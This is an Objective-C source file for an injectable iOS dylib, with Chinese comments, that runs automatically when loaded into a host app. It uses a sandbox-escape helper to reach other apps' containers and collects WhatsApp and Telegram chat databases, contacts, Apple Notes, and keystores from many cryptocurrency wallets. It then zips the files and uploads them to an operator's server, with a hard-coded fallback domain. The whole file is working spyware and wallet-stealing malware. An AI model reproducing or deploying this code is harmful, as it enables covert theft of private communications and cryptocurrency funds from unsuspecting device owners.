// WQCollector.m — 以 worse_query 为容器入口的采集 dylib（注入 OPEN，不改主程序）
//
// 设计原则（按需求：不破坏原包能力）：
//   * 只在旁边新增一条采集链路，不 hook、不替换 OPEN 的任何函数；
//   * 目标文件清单与 OPEN 的 pass1 基本一致，产物单独命名（wq_*.zip），不会覆盖 cold_wallets.zip；
//   * MHA 可用时 OPEN 自己的 pipeline 照旧，本 dylib 与之并行；
//   * 上传端点从包内 flag 文件读取，保证与运营方现有服务端一致。
//
// 依赖：worse_query.m（GPL-3.0-or-later）+ App Group entitlement

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <Security/Security.h>
#import <zlib.h>
#import <dlfcn.h>
#import <stdarg.h>
#include "worse_query.h"

// SecTask 的部分符号在个别 SDK 里没有公开声明，显式声明一次，避免 implicit declaration 报错
extern SecTaskRef SecTaskCreateFromSelf(CFAllocatorRef allocator);
extern CFTypeRef SecTaskCopyValueForEntitlement(SecTaskRef task, CFStringRef entitlement, CFErrorRef *error);

static NSString *const kLogName   = @"wq_collector.log";
static NSString *const kStaging   = @"wq_staging";
static NSString *const kZipPrefix = @"wq_";

#pragma mark - 日志

static void WQLog(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[WQ] %@", msg);
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:kLogName];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[msg stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh closeFile];
}

#pragma mark - 环境：App Group / 系统版本

static NSString *WQAppGroup(void) {
    SecTaskRef task = SecTaskCreateFromSelf(kCFAllocatorDefault);
    if (!task) return nil;
    CFTypeRef v = SecTaskCopyValueForEntitlement(task, CFSTR("com.apple.security.application-groups"), NULL);
    CFRelease(task);
    NSString *g = nil;
    if (v && CFGetTypeID(v) == CFArrayGetTypeID()) {
        NSArray *arr = (__bridge_transfer NSArray *)v;
        if (arr.count) g = arr.firstObject;
    } else if (v) {
        CFRelease(v);
    }
    return g;
}

// iOS 26.x 需要 alt flags；27+ 用默认 flags
static BOOL WQAltFlags(void) {
    NSOperatingSystemVersion v = NSProcessInfo.processInfo.operatingSystemVersion;
    if (v.majorVersion == 26) return YES;
    if (v.majorVersion == 27) return NO;
    return v.majorVersion < 27;      // 未知版本：26 及以下按 alt，更新系统按新 flags
}

static NSString *WQContainerRoot(void) { return @"/private/var/mobile/Containers/Data/Application"; }
static NSString *WQGroupRoot(void)     { return @"/private/var/mobile/Containers/Shared/AppGroup"; }

#pragma mark - 容器索引（MCMMetadataIdentifier）

static NSDictionary<NSString *, NSString *> *WQIndexContainers(NSString *root, NSString *group, BOOL alt) {
    NSMutableDictionary *map = [NSMutableDictionary dictionary];
    int64_t h = worse_query(root, group, alt, false);
    if (h < 0) { WQLog(@"grant root failed: %lld (%@)", h, root); return map; }

    NSArray *kids = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:root error:nil];
    WQLog(@"root listed: %lu entries", (unsigned long)kids.count);
    for (NSString *k in kids) {
        NSString *dir = [root stringByAppendingPathComponent:k];
        NSString *meta = [dir stringByAppendingPathComponent:@".com.apple.mobile_container_manager.metadata.plist"];
        NSDictionary *pl = [NSDictionary dictionaryWithContentsOfFile:meta];
        id identObj = pl[@"MCMMetadataIdentifier"];
        if ([identObj isKindOfClass:[NSString class]] && [(NSString *)identObj length]) {
            map[(NSString *)identObj] = dir;
        }
    }
    worse_query_release(h);
    WQLog(@"indexed %lu containers under %@", (unsigned long)map.count, root);
    return map;
}

#pragma mark - 目标清单（与 OPEN 的 pass1 对齐）

static NSDictionary<NSString *, NSArray<NSString *> *> *WQTargets(void) {
    return @{
        @"net.whatsapp.WhatsApp": @[@"Documents/ChatStorage.sqlite",
                                    @"Documents/ChatStorage.sqlite-wal",
                                    @"Documents/ChatStorage.sqlite-shm",
                                    @"Documents/ContactsV2.sqlite",
                                    @"Library/Preferences/net.whatsapp.WhatsApp.plist"],
        @"net.whatsapp.WhatsAppSMB": @[@"Documents/ChatStorage.sqlite",
                                       @"Documents/ChatStorage.sqlite-wal"],
        @"ph.telegra.Telegraph": @[@"Documents/postbox/db",
                                   @"Documents/postbox/db-wal",
                                   @"Library/Preferences/ph.telegra.Telegraph.plist"],
        @"io.metamask.MetaMask": @[@"Documents/persistStore/persist-KeyringController",
                                   @"Documents/persistStore/persist-AccountsController"],
        @"com.sixdays.trust": @[@"Documents/temp-cloud-keystore",
                                @"Library/Preferences/com.sixdays.trust.plist"],
        @"com.bitpie.wallet": @[@"Documents/walletsV2",
                                @"Library/Preferences/com.bitpie.wallet.plist"],
        @"com.tronlink.hdwallet": @[@"Documents/TronLinkData.sqlite", @"Documents/keystore"],
        @"com.global.wallet.ios": @[@"Documents/db/main.sqlite3", @"Documents/F4SeCyr"],
        @"com.okex.okexwallet": @[@"Documents/wallet", @"Library/Preferences/com.okex.okexwallet.plist"],
        @"im.token.app": @[@"Library/Application Support/im.token.app"],
        @"app.phantom": @[@"Library/Preferences/app.phantom.plist"],
        @"group.com.apple.notes": @[@"NoteStore.sqlite"],       // App Group
    };
}

#pragma mark - 最小 ZIP（store，无压缩）

static uint32_t WQCRC(NSString *path) {
    NSFileHandle *fh = [NSFileHandle fileHandleForReadingAtPath:path];
    if (!fh) return 0;
    uint32_t crc = crc32(0L, Z_NULL, 0);
    while (1) {
        @autoreleasepool {
            NSData *c = [fh readDataOfLength:1 << 20];
            if (!c.length) break;
            crc = crc32(crc, c.bytes, (uInt)c.length);
        }
    }
    [fh closeFile];
    return crc;
}

static void WQLE(NSMutableData *d, uint32_t v, int n) {
    for (int i = 0; i < n; i++) { uint8_t b = (v >> (8 * i)) & 0xff; [d appendBytes:&b length:1]; }
}

static NSData *WQZip(NSArray<NSDictionary *> *items) {
    NSMutableData *out = [NSMutableData data], *cd = [NSMutableData data];
    for (NSDictionary *it in items) {
        NSString *name = it[@"name"], *path = it[@"path"];
        NSDictionary *attr = [[NSFileManager defaultManager] attributesOfItemAtPath:path error:nil];
        if (!attr) continue;
        uint32_t size = (uint32_t)[attr fileSize];
        uint32_t crc = WQCRC(path);
        NSData *nd = [name dataUsingEncoding:NSUTF8StringEncoding];
        uint32_t local = (uint32_t)out.length;

        WQLE(out, 0x04034b50, 4); WQLE(out, 20, 2); WQLE(out, 0, 2); WQLE(out, 0, 2);
        WQLE(out, 0, 2); WQLE(out, 0, 2); WQLE(out, crc, 4); WQLE(out, size, 4); WQLE(out, size, 4);
        WQLE(out, (uint32_t)nd.length, 2); WQLE(out, 0, 2); [out appendData:nd];
        NSFileHandle *fh = [NSFileHandle fileHandleForReadingAtPath:path];
        while (1) {
            @autoreleasepool {
                NSData *c = [fh readDataOfLength:1 << 20];
                if (!c.length) break;
                [out appendData:c];
            }
        }
        [fh closeFile];

        WQLE(cd, 0x02014b50, 4); WQLE(cd, 20, 2); WQLE(cd, 20, 2); WQLE(cd, 0, 2); WQLE(cd, 0, 2);
        WQLE(cd, 0, 2); WQLE(cd, 0, 2); WQLE(cd, crc, 4); WQLE(cd, size, 4); WQLE(cd, size, 4);
        WQLE(cd, (uint32_t)nd.length, 2); WQLE(cd, 0, 2); WQLE(cd, 0, 2); WQLE(cd, 0, 2);
        WQLE(cd, 0, 2); WQLE(cd, 0, 4); WQLE(cd, local, 4); [cd appendData:nd];
    }
    uint32_t cdStart = (uint32_t)out.length;
    [out appendData:cd];
    WQLE(out, 0x06054b50, 4); WQLE(out, 0, 2); WQLE(out, 0, 2);
    WQLE(out, (uint32_t)items.count, 2); WQLE(out, (uint32_t)items.count, 2);
    WQLE(out, (uint32_t)cd.length, 4); WQLE(out, cdStart, 4); WQLE(out, 0, 2);
    return out;
}

#pragma mark - 端点（与 OPEN 一致：读包内 flag）

static NSString *WQEndpoint(void) {
    NSString *flagPath = [[NSBundle mainBundle] pathForResource:@"flag" ofType:nil];
    NSString *text = [NSString stringWithContentsOfFile:flagPath encoding:NSUTF8StringEncoding error:nil];
    if (text.length) {
        NSArray *parts = [text componentsSeparatedByString:@"----"];
        for (NSString *p in [parts reverseObjectEnumerator]) {
            NSString *t = [p stringByTrimmingCharactersInSet:NSCharacterSet.whitespaceAndNewlineCharacterSet];
            if ([t hasPrefix:@"http"]) return t;
        }
    }
    return @"https://dg43t3w4t23t.com/";     // 兜底：名人国际那套
}

static void WQUpload(NSData *body, NSString *name, void (^done)(BOOL)) {
    NSString *b = @"----WebKitFormBoundaryWQCollector";
    NSMutableData *d = [NSMutableData data];
    [d appendData:[[NSString stringWithFormat:@"--%@\r\n", b] dataUsingEncoding:NSUTF8StringEncoding]];
    [d appendData:[[NSString stringWithFormat:
        @"Content-Disposition: form-data; name=\"file\"; filename=\"%@\"\r\n", name]
        dataUsingEncoding:NSUTF8StringEncoding]];
    [d appendData:[@"Content-Type: application/octet-stream\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [d appendData:body];
    [d appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [d appendData:[[NSString stringWithFormat:@"--%@--\r\n", b] dataUsingEncoding:NSUTF8StringEncoding]];

    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:WQEndpoint()]];
    req.HTTPMethod = @"POST";
    [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", b] forHTTPHeaderField:@"Content-Type"];
    req.timeoutInterval = 300;
    [[[NSURLSession sharedSession] uploadTaskWithRequest:req fromData:d
        completionHandler:^(NSData *resp, NSURLResponse *r, NSError *e) {
        NSInteger code = [(NSHTTPURLResponse *)r statusCode];
        WQLog(@"upload %@ -> %ld %@", name, (long)code, e ?: @"");
        if (done) done(code / 100 == 2);
    }] resume];
}

#pragma mark - 采集

static NSString *WQStagingDir(void) {
    NSString *d = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                   stringByAppendingPathComponent:kStaging];
    [[NSFileManager defaultManager] createDirectoryAtPath:d withIntermediateDirectories:true attributes:nil error:nil];
    return d;
}

static void WQCollectOne(NSString *bundle, NSString *container, NSString *group, BOOL alt,
                         NSArray<NSString *> *rel, NSMutableArray *acc) {
    int64_t h = worse_query(container, group, alt, false);
    if (h < 0) { WQLog(@"%@ grant failed: %lld", bundle, h); return; }

    NSUInteger before = acc.count;
    for (NSString *r in rel) {
        NSString *abs = [container stringByAppendingPathComponent:r];
        BOOL isDir = NO;
        if (![[NSFileManager defaultManager] fileExistsAtPath:abs isDirectory:&isDir]) {
            WQLog(@"%@ missing %@", bundle, r);
            continue;
        }
        if (isDir) {
            NSDirectoryEnumerator *en = [[NSFileManager defaultManager] enumeratorAtPath:abs];
            for (NSString *sub in en) {
                NSString *p = [abs stringByAppendingPathComponent:sub];
                unsigned long long sz = [[[NSFileManager defaultManager] attributesOfItemAtPath:p error:nil] fileSize];
                if (!sz || sz > 512ull * 1024 * 1024) continue;      // 超大项跳过，别撑爆上传
                [acc addObject:@{@"name": [NSString stringWithFormat:@"%@/%@/%@", bundle, r, sub], @"path": p}];
            }
        } else {
            NSData *probe = [NSData dataWithContentsOfFile:abs options:0 error:nil];
            if (!probe.length) { WQLog(@"%@ 0 bytes readable: %@", bundle, r); continue; }
            [acc addObject:@{@"name": [NSString stringWithFormat:@"%@/%@", bundle, r], @"path": abs}];
        }
    }
    worse_query_release(h);
    WQLog(@"%@ collected %lu files", bundle, (unsigned long)(acc.count - before));
}

#pragma mark - 入口

__attribute__((constructor))
static void WQInit(void) {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(4 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        NSString *group = WQAppGroup();
        if (!group) {
            WQLog(@"NO APP GROUP — 签名没有带 com.apple.security.application-groups，worse_query 不可用");
            return;
        }
        BOOL alt = WQAltFlags();
        NSOperatingSystemVersion v = NSProcessInfo.processInfo.operatingSystemVersion;
        WQLog(@"start: group=%@ os=%ld.%ld alt_flags=%d", group, (long)v.majorVersion, (long)v.minorVersion, alt);

        // 1) 建立容器索引（App Data + App Group）
        NSMutableDictionary *idx = [NSMutableDictionary dictionary];
        [idx addEntriesFromDictionary:WQIndexContainers(WQContainerRoot(), group, alt)];
        [idx addEntriesFromDictionary:WQIndexContainers(WQGroupRoot(), group, alt)];
        if (!idx.count) { WQLog(@"容器索引为空，终止"); return; }

        // 2) 逐个目标采集（worse_query 提供访问权，OPEN 的 MHA 路径不受影响）
        NSMutableArray *acc = [NSMutableArray array];
        for (NSString *bundle in WQTargets()) {
            NSString *c = idx[bundle];
            if (!c) { WQLog(@"%@ 容器不存在（未安装或索引未命中）", bundle); continue; }
            WQCollectOne(bundle, c, group, alt, WQTargets()[bundle], acc);
        }
        if (!acc.count) { WQLog(@"没有可打包内容"); return; }

        // 3) 打包 + 上传（文件名与 OPEN 的冷钱包包区分开，避免覆盖）
        NSData *zip = WQZip(acc);
        NSString *name = [NSString stringWithFormat:@"%@%ld_files_%@.zip", kZipPrefix,
                          (long)acc.count, [NSDate date].description];
        name = [name stringByReplacingOccurrencesOfString:@" " withString:@"_"];
        NSString *local = [WQStagingDir() stringByAppendingPathComponent:name];
        [zip writeToFile:local atomically:YES];
        WQLog(@"zip %@ (%lu bytes)", name, (unsigned long)zip.length);
        WQUpload(zip, name, ^(BOOL ok) { WQLog(@"done: %@", ok ? @"ok" : @"fail"); });
    });
}
